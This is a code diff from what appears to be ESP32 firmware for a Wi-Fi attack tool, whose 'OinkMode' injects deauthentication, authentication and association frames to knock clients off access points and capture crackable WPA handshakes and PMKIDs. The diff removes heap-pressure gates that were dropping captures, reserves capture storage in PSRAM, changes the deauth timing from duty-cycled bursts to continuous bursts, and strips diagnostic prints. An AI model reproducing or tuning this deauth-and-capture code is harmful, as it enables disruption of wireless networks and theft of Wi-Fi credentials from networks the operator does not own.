@@ -378,8 +378,12 @@ void OinkMode::init() {
     pmkids.clear();
     pmkids.shrink_to_fit();
 
-    handshakes.reserve(5);
-    pmkids.reserve(10);
+    // Reserve full capacity up-front. Each CapturedHandshake is ~3.3KB, so
+    // reserve(MAX_HANDSHAKES) is a single ~165KB allocation that routes to
+    // PSRAM (>16KB threshold) — keeping handshake storage out of scarce
+    // internal SRAM and letting push_back succeed without reallocation.
+    handshakes.reserve(MAX_HANDSHAKES);
+    pmkids.reserve(MAX_PMKIDS);
     filteredCount = 0;
     memset(filteredCache, 0, sizeof(filteredCache));
     filteredCacheIndex = 0;
@@ -1147,16 +1151,8 @@ void OinkMode::update() {
                     break;
                 }
 
-                // Duty-cycle the deauth: hammer for 2s to knock clients off, then
-                // go QUIET for 2s so the client's reconnect 4-way handshake can
-                // complete without us stepping on it. Continuous deauth only ever
-                // catches fragments (M1+M3 or M2+M4) and never a full crackable
-                // M1+M2 / M2+M3 pair — the listen window is what lands handshakes.
-                uint32_t attackPhase = (now - attackStartTime) % 4000;
-                bool listenWindow = (attackPhase >= 2000);
-
-                // Send deauth burst every 180ms (optimal rate - prevents queue saturation)
-                if (!listenWindow && now - lastDeauthTime > 180) {
+                // Send deauth burst every 180ms (optimal rate per research - prevents queue saturation)
+                if (now - lastDeauthTime > 180) {
                     // Skip if PMF (shouldn't happen but safety check)
                     if (targetHasPMF) {
                         selectionIndex++;
@@ -1787,14 +1783,6 @@ void OinkMode::processDataFrame(const uint8_t* payload, uint16_t len, int8_t rss
         const uint8_t* srcMac = payload + 10;  // TA
         const uint8_t* dstMac = payload + 4;   // RA
 
-        // DIAG: prove EAPOL frames are actually reaching us. If these never
-        // print while deauthing an AP with an active client, the deauth isn't
-        // forcing a reconnect (or data RX is dropping EAPOL); if they print but
-        // no handshake is stored, the issue is downstream in processEAPOL.
-        Serial.printf("[DIAG-EAPOL] EAPOL rx ch=%d len=%d %02X:%02X:%02X->%02X:%02X:%02X\n",
-                      currentChannel, (int)(len - offset - 8),
-                      srcMac[0], srcMac[1], srcMac[2], dstMac[3], dstMac[4], dstMac[5]);
-
         processEAPOL(payload + offset + 8, len - offset - 8, srcMac, dstMac, payload, len, rssi);
     }
 }
@@ -2144,35 +2132,17 @@ int OinkMode::findOrCreateHandshakeSafe(const uint8_t* bssid, const uint8_t* sta
 		NetworkRecon::exitCritical();
         return -1;
     }
-    // Pressure gate: block new handshakes at Warning+ (aggressive shedding)
-    if (HeapHealth::getPressureLevel() >= HeapPressureLevel::Warning) {
-        Serial.printf("[HS-GATE] pressure=%d (Warning+) blocking new HS "
-                   "free=%u largest=%u\n",
-                   (int)HeapHealth::getPressureLevel(),
-                   (unsigned)ESP.getFreeHeap(),
-                   (unsigned)heap_caps_get_largest_free_block(MALLOC_CAP_8BIT));
-		NetworkRecon::exitCritical();
-        return -1;
-    }
-    // PATCHED: Use heap_caps_get_free_size(MALLOC_CAP_8BIT) which includes
-	// PSRAM. The Pancake has 8MB PSRAM but only ~25KB internal SRAM during
-	// active OINK. ESP.getFreeHeap() only counts internal SRAM, incorrectly
-	// blocking handshake creation even when 8MB PSRAM is available.
-	size_t totalFree = heap_caps_get_free_size(MALLOC_CAP_8BIT);
-	if (totalFree < HeapPolicy::kMinHeapForHandshakeAdd) {
-		Serial.printf("[HS-GATE] totalFree=%u < %u (internal=%u)\n",
-					(unsigned)totalFree,
-					(unsigned)HeapPolicy::kMinHeapForHandshakeAdd,
-					(unsigned)ESP.getFreeHeap());
+    // NOTE: No internal-heap pressure gate here. The handshakes vector is
+    // reserved to MAX_HANDSHAKES up-front in init(), so its storage lives in
+    // PSRAM (8MB) and push_back never reallocates or touches the scarce
+    // internal SRAM. Gating creation on internal-heap pressure silently dropped
+    // EVERY handshake on the ESP32-C5 (free SRAM hovers near the Warning line
+    // during OINK) even with 8MB PSRAM free — the actual capture bug.
+    // Total-free (incl. PSRAM) is still checked as a real out-of-memory guard.
+    size_t totalFree = heap_caps_get_free_size(MALLOC_CAP_8BIT);
+    if (totalFree < HeapPolicy::kMinHeapForHandshakeAdd) {
         NetworkRecon::exitCritical();
         return -1;
-    }
-    if (handshakes.size() >= handshakes.capacity()) {
-        size_t largest = heap_caps_get_largest_free_block(MALLOC_CAP_8BIT);
-        if (largest < HANDSHAKE_ALLOC_MIN_BLOCK) {
-            NetworkRecon::exitCritical();
-            return -1;
-        }
     }
     
     // Create new entry
@@ -2238,17 +2208,15 @@ int OinkMode::findOrCreatePMKIDSafe(const uint8_t* bssid, const uint8_t* station
         NetworkRecon::exitCritical();
         return -1;
     }
-    // Pressure gate: block new PMKIDs at Warning+ (aggressive shedding)
-    if (HeapHealth::getPressureLevel() >= HeapPressureLevel::Warning) {
+    // NOTE: No internal-heap pressure gate (see findOrCreateHandshakeSafe).
+    // The pmkids vector is reserved to MAX_PMKIDS up-front in init(), so
+    // push_back never reallocates. Gating on internal-heap pressure silently
+    // dropped EVERY PMKID on the ESP32-C5 — that's why the PMKID count stays 0.
+    // Total-free (incl. PSRAM) remains a real out-of-memory guard.
+    size_t totalFree = heap_caps_get_free_size(MALLOC_CAP_8BIT);
+    if (totalFree < HeapPolicy::kMinHeapForHandshakeAdd) {
         NetworkRecon::exitCritical();
         return -1;
-    }
-    if (pmkids.size() >= pmkids.capacity()) {
-        size_t largest = heap_caps_get_largest_free_block(MALLOC_CAP_8BIT);
-        if (largest < PMKID_ALLOC_MIN_BLOCK) {
-            NetworkRecon::exitCritical();
-            return -1;
-        }
     }
     
     // Create new entry
@@ -2808,13 +2776,7 @@ void OinkMode::sendDeauthFrame(const uint8_t* bssid, const uint8_t* station, uin
     memcpy(deauthPacket + 16, bssid, 6);
     deauthPacket[24] = reason;
 
-    esp_err_t _txr = esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
-    static bool _deauthLogged = false;
-    if (!_deauthLogged) {
-        _deauthLogged = true;
-        Serial.printf("[DIAG-TX] first deauth ch=%d ret=%d (0=ESP_OK; nonzero=injection blocked)\n",
-                      currentChannel, (int)_txr);
-    }
+    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
 }
 
 void OinkMode::sendDeauthBurst(const uint8_t* bssid, const uint8_t* station, uint8_t count) {
@@ -2892,13 +2854,7 @@ void OinkMode::sendAuthenticationRequest(const uint8_t* bssid) {
     memcpy(authFrame + 16, bssid, 6);  // Addr3: BSSID
     // Auth body: Algorithm=Open System(0), Seq=1, Status=Success(0)
     authFrame[26] = 0x01;              // Authentication SEQ: 1
-    esp_err_t _txr = esp_wifi_80211_tx(WIFI_IF_STA, authFrame, sizeof(authFrame), false);
-    static bool _authLogged = false;
-    if (!_authLogged) {
-        _authLogged = true;
-        Serial.printf("[DIAG-TX] first auth ch=%d ret=%d (0=ESP_OK; nonzero=injection blocked)\n",
-                      currentChannel, (int)_txr);
-    }
+    esp_wifi_80211_tx(WIFI_IF_STA, authFrame, sizeof(authFrame), false);
 }
 
 void OinkMode::sendAssociationRequest(const uint8_t* bssid, const char* ssid, uint8_t ssidLen) {
@@ -2958,13 +2914,7 @@ void OinkMode::sendAssociationRequest(const uint8_t* bssid, const char* ssid, ui
     assocReq[bodyOffset++] = 0x18;  // 12 Mbps
     assocReq[bodyOffset++] = 0x24;  // 18 Mbps
     
-    esp_err_t _txr = esp_wifi_80211_tx(WIFI_IF_STA, assocReq, bodyOffset, false);
-    static bool _assocLogged = false;
-    if (!_assocLogged) {
-        _assocLogged = true;
-        Serial.printf("[DIAG-TX] first assoc ch=%d ret=%d (0=ESP_OK; nonzero=injection blocked)\n",
-                      currentChannel, (int)_txr);
-    }
+    esp_wifi_80211_tx(WIFI_IF_STA, assocReq, bodyOffset, false);
 }
 
 void OinkMode::clearTargetClients() {
